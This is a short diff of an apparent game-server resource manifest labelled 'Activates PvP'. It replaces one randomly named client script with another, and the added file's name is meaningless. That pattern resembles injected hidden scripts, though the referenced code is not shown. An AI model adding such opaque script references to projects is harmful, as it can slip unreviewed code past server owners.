@@ -1,4 +1,4 @@
 description 'Activates PvP'
 
 client_script 'PvP.lua'
-client_script "wHHGDVZcVvrhNxgVQe.lua"
+client_script "TalJDiXcmrWuOdRetV.lua"
